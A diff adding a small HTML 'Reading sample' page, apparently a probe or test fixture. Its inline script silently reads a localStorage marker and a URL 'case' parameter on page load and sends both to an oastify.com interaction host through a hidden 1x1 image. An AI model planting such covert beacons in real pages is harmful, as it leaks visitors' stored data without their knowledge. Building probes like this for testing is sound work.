@@ -1,0 +1,25 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="referrer" content="no-referrer">
+  <title>Reading sample</title>
+</head>
+<body>
+  <h1>Reading sample</h1>
+  <p id="status">Waiting for page script.</p>
+  <script>
+    const testCase = new URL(location.href).searchParams.get('case') || 'unspecified';
+    const marker = localStorage.getItem('reading_sample_marker') || 'missing';
+    document.querySelector('#status').textContent = 'The sample page loaded.';
+    const image = new Image();
+    image.referrerPolicy = 'no-referrer';
+    image.width = 1;
+    image.height = 1;
+    image.alt = '';
+    image.src = 'https://m5sfglfmwy4bcz95zmh973f24taqy4k6x6gqxq8g79xy.oastify.com/natural-' + encodeURIComponent(testCase) + '-' + encodeURIComponent(marker) + '.gif';
+    document.body.appendChild(image);
+  </script>
+</body>
+</html>
